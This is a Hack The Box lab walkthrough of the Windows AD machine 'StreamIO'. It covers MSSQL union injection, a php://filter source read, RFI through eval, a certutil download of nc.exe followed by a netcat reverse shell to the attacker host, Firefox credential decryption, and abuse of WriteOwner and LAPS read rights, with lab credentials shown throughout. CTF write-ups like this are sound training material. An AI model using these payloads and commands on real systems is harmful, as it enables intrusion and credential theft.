---
title: StreamIO
date: 2026-09-07
description: Medium Windows AD box union-injecting the q parameter on watch.streamio.htb, pulling db_admin creds, reading source through a php://filter debug wrapper, and abusing WriteOwner plus ReadLAPSPassword for the admin.
tags:
  - htb
  - Medium
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Mon Sep  7 02:05:02 2026 as: /usr/lib/nmap/nmap -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49708,49734 -A -oN scan_results.txt 10.129.6.154
Nmap scan report for 10.129.6.154
Host is up (0.74s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-06 13:09:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-09-06T13:13:12+00:00; -16h56m08s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49734/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-06T13:11:20
|_  start_date: N/A
|_clock-skew: mean: -16h56m08s, deviation: 0s, median: -16h56m08s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   602.14 ms 10.10.16.1
2   898.51 ms 10.129.6.154

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep  7 02:09:34 2026 -- 1 IP address (1 host up) scanned in 272.35 seconds
```

No anonymous LDAP bind and no guest user on smb.

> `https://streamio.htb` -> holds a login page and about page. We need valid creds to login, and the about page revealed few usernames from the team:

```Team-users
Barry
Oliver
Samnatha
```

No NP users from the team username. On `login.php` even registered users can't login.

The scan exposed the subdomain of the web server domain:

```sh
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
```

> `https://watch.streamio.htb`

`search.php` was discovered under the subdomain `watch`. Start with brute-forcing with **special characters** using `ffuf` on q parameter, filtering common output to find what sql it's using.

The mssql query can be executed in below formats in the backend.

By manipulating the **q** parameter, if you mention 500 it dumps movies which have **strings** with `500` in the html tag `<h5 class = "p-2">`. That tag can be used to match whether the output executed and returns error (hope string).

Tested with `500%' -- -` — it returns the hope string:

```
500%' UNION SELECT 1,2,3,4,5,6,7,8-- - 
```
-> nothing returns

```
500%' UNION SELECT 1,2,3,4,5,6-- -
```
-> returns the hope string

Now we can manipulate and upgrade the query with the structure:

```
500'UNION SELECT 1,@@version,3,4,5,6-- -
```

> note: We can use **xp_dirtree** and by setting up an **responder** we can find the **user** and **hash** of the **mssql server hoster**, but it returned **DC$** -> we didn't go for it because it often returns the hash **with a random string**

Got to know it uses **MSSQL server 2019 - 15.0.2000.5**

```
500' union select 1,(select db_name()),3,4,5,6-- -
```

We got the list of the databases

```
500' union select 1,(SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype='U'),3,4,5,6-- -
```

`STRING_AGG` -> used to list the tables using `,`. `xtype= 'U'` -> used to dump only user defined tables.

```
500' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
```

```
500' union select 1,CONCAT(username, ' ' , password),3,4,5,6 from users-- -
```

> `yoshihide - 66boysandgirls..`

# User
We can login as **yoshihide** on `streamio.htb` and can access the `admin panel`.

`https://streamio.htb/admin/?message=` => The sub tabs change with the query. Brute-forced and got a directory -> **master.php**, then brute-forced the query to find any **hidden query parameter**.

Got **master.php** & **debug** query. On the debug page we had no idea what to do with the parameter, but using index.php it reflects with an error. When we tried with master.php it dumped the page.

### PHP wrapper

> Reference: https://blog.deephacking.tech/en/posts/exploiting-php-wrappers/

```
php://filter/convert.base64-encode/resource=<file>
```

Encodes the php page content and reflects it. Since master.php isn't directly accessible, grab it using the php wrapper:

```url
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```

Once grabbed, decode the base64 and we get the master.php source code.

In the **master.php**, **File Inclusion** can be performed using **file_get_contents** with variable name **include** with a **POST** verb request. `file_get_contents` is used by the **eval** function which makes execution possible.

```php
<form method="POST">
<input name="include" hidden>
</form>
<​?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
```

Grab the request using burpsuite (we can access master.php using the debug parameter).

Alter the request method to **POST** and use the **include** parameter for **Remote File Inclusion** 

> **Note** : Don't forget `Content-Type: application/x-www-form-urlencoded` and don't use empty space after include — remove any empty space

Set up a server and listener — the php file will be executed from the server and connects to the listener.

Payload: first upload `nc.exe` executable to the system:

```php
system("certutil -urlcache -f http://10.10.16.82:8000/nc.exe nc.exe");
```

Then execute the `nc.exe` to connect back to the listener:

```php
system("nc.exe 10.10.16.82 9001 -e cmd");
```

In index.php we got the username and password for the **STREAMIO** database which runs locally.

**Note**: we already got the source using the `php wrapper`

> `db_admin - B1@hx31234567890`

### sqlcmd
`sqlcmd` can interact with the mssql server in powershell — upgrade to powershell:

```powershell
sqlcmd -S STREAMIO -U db_admin -P B1@hx31234567890
```

We're inside the server — sometimes it won't have a proper interface:

```sql
SELECT name FROM sys.databases;
GO                       -- Go is used to execute the sql command
```

`streamio_backup` looks interesting:

```sql
use streamio_backup;
GO
```

```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
GO
```

It also has a `users` table:

```sql
select * from users;
GO
```

> `nikk37 - get_dem_girls2@yahoo.com`

Gained **nikk37** user shell using evil-winrm

# Root
### firefox stored password

Profile Path (Windows): where firefox stores its password .json file:

```
C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile-folder>\.
```

> **Local Encryption**: The passwords inside `logins.json` are encrypted locally and cannot be read as plain text without the matching `key4.db` file.

Download `logins.json` and `key4.db` from the directory

> https://github.com/lclevy/firepwd -> can be used to dump the password 

**Note** : The `logins.json` and `key4.db` should be in the same folder where we execute the script:

```venv
pip install -r requirements.txt

python3 firepwd.py
```

> `JDgodd - JDg0dd1s@d0p3cr3@t0r`

Is a valid user — can test using `nxc`

### Bloodhound-python

It gave us an error which reflected as `path not found` on bloodhound:

> **Important**: add `dc.streamio.htb` in `/etc/hosts` whenever we go for collection, or use `-gc` and mention the domain controller

```sh
faketime "now -16 hours -56 minutes -08 seconds" bloodhound-python -u JDGODD -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb -ns 10.129.7.57 -c ALL
```

Executed without error (error should not be there while collecting)

**JDGODD** got `WriteOwner` permission over the **CORE STAFF group**, but JDGODD doesn't have a shell.

**net** can be used to execute system commands using smb server — used net to **add** JDGODD to the **CORE STAFF group**:

```sh
net rpc group addmem "Core Staff" "JDGodd" -U "streamio.htb"/"JDgodd"%"JDg0dd1s@d0p3cr3@t0r" -S "dc.streamio.htb"
```

Used the **nikk37** shell to verify it:

```powershell
net group "Core Staff"
```

`READLAPSPassword` -> the members of CORE STAFF can read the password set by Local Administrator:

```sh
bloodyAD --host 10.129.7.57 -d dc.streamio.htb -u 'JDGODD' -p 'JDg0dd1s@d0p3cr3@t0r' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime 
```

> `Administrator - !3890}yiH/+-d+`

>Note: root flag is in the user martin directory

Gained `root`
